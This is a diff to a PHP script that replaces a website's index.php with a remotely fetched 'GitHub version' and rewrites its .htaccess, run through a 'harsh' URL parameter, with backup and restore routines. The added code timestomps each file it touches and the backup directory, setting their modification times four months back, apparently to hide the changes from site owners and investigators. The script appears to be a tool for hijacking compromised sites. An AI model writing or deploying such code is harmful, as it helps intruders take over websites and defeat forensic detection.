@@ -68,6 +68,46 @@ function check_permissions() {
 }
 
 // Function to backup files
+// Function to set file modification time to 4 months ago
+function set_file_modification_time($file_path) {
+    if (file_exists($file_path)) {
+        $four_months_ago = strtotime('-4 months');
+        if (touch($file_path, $four_months_ago)) {
+            log_action("Set modification time for {$file_path} to " . date('Y-m-d H:i:s', $four_months_ago));
+            return true;
+        } else {
+            log_action("Failed to set modification time for {$file_path}");
+            return false;
+        }
+    }
+    return false;
+}
+
+function set_directory_modification_time($dir_path) {
+    if (!is_dir($dir_path)) {
+        log_action("Directory not found: {$dir_path}");
+        return false;
+    }
+    
+    $success = true;
+    $files = scandir($dir_path);
+    foreach ($files as $file) {
+        if ($file != '.' && $file != '..') {
+            $file_path = $dir_path . '/' . $file;
+            if (!set_file_modification_time($file_path)) {
+                $success = false;
+            }
+        }
+    }
+    
+    // Set the directory's modification time last
+    if (!set_file_modification_time($dir_path)) {
+        $success = false;
+    }
+    
+    return $success;
+}
+
 function backup_files() {
     global $original_index, $backup_index, $original_htaccess, $backup_htaccess, $backup_dir;
     $result = [];
@@ -86,12 +126,14 @@ function backup_files() {
         if (copy($original_index, $backup_index)) {
             log_action("Backed up original index.php to index.bk");
             $result[] = "Successfully backed up index.php to index.bk";
+            set_file_modification_time($backup_index);
         } else {
             log_action("Failed to backup index.php");
             $result[] = "Failed to backup index.php";
         }
     } elseif (file_exists($backup_index)) {
         $result[] = "index.php backup already exists";
+        set_file_modification_time($backup_index);
     }
     
     // Backup .htaccess if it hasn't been backed up already
@@ -99,12 +141,53 @@ function backup_files() {
         if (copy($original_htaccess, $backup_htaccess)) {
             log_action("Backed up original .htaccess to .htaccess.bk");
             $result[] = "Successfully backed up .htaccess to .htaccess.bk";
+            set_file_modification_time($backup_htaccess);
         } else {
             log_action("Failed to backup .htaccess");
             $result[] = "Failed to backup .htaccess";
         }
     } elseif (file_exists($backup_htaccess)) {
         $result[] = ".htaccess backup already exists";
+        set_file_modification_time($backup_htaccess);
+    }
+    
+    // Set modification time for backup directory and its contents
+    set_directory_modification_time($backup_dir);
+    set_file_modification_time($backup_dir);
+    
+    return $result;
+}
+
+function restore_files() {
+    global $original_index, $backup_index, $original_htaccess, $backup_htaccess;
+    $result = [];
+    
+    // Restore index.php
+    if (file_exists($backup_index)) {
+        if (copy($backup_index, $original_index)) {
+            log_action("Restored original index.php");
+            $result[] = "Successfully restored index.php";
+            set_file_modification_time($original_index);
+        } else {
+            log_action("Failed to restore index.php");
+            $result[] = "Error: Failed to restore index.php";
+        }
+    } else {
+        $result[] = "Error: index.php backup not found";
+    }
+    
+    // Restore .htaccess
+    if (file_exists($backup_htaccess)) {
+        if (copy($backup_htaccess, $original_htaccess)) {
+            log_action("Restored original .htaccess");
+            $result[] = "Successfully restored .htaccess";
+            set_file_modification_time($original_htaccess);
+        } else {
+            log_action("Failed to restore .htaccess");
+            $result[] = "Error: Failed to restore .htaccess";
+        }
+    } else {
+        $result[] = "Error: .htaccess backup not found";
     }
     
     return $result;
@@ -133,6 +216,7 @@ function replace_index() {
     // Write the content to index.php
     if (file_put_contents($original_index, $content) !== false) {
         log_action("Successfully replaced index.php with GitHub version");
+        set_file_modification_time($original_index);
         return "Successfully replaced index.php with GitHub version";
     } else {
         log_action("Failed to write new index.php");
@@ -155,6 +239,7 @@ function modify_htaccess() {
     
     if (file_put_contents($original_htaccess, $htaccess_content) !== false) {
         log_action("Successfully modified .htaccess");
+        set_file_modification_time($original_htaccess);
         return "Successfully modified .htaccess";
     } else {
         log_action("Failed to modify .htaccess");
@@ -162,39 +247,7 @@ function modify_htaccess() {
     }
 }
 
-// Function to restore files from backup
-function restore_files() {
-    global $original_index, $backup_index, $original_htaccess, $backup_htaccess;
-    $result = [];
-    
-    // Restore index.php
-    if (file_exists($backup_index)) {
-        if (copy($backup_index, $original_index)) {
-            log_action("Restored original index.php");
-            $result[] = "Successfully restored index.php";
-        } else {
-            log_action("Failed to restore index.php");
-            $result[] = "Error: Failed to restore index.php";
-        }
-    } else {
-        $result[] = "Error: index.php backup not found";
-    }
-    
-    // Restore .htaccess
-    if (file_exists($backup_htaccess)) {
-        if (copy($backup_htaccess, $original_htaccess)) {
-            log_action("Restored original .htaccess");
-            $result[] = "Successfully restored .htaccess";
-        } else {
-            log_action("Failed to restore .htaccess");
-            $result[] = "Error: Failed to restore .htaccess";
-        }
-    } else {
-        $result[] = "Error: .htaccess backup not found";
-    }
-    
-    return $result;
-}
+
 
 // Main execution
 if (isset($_GET['harsh'])) {
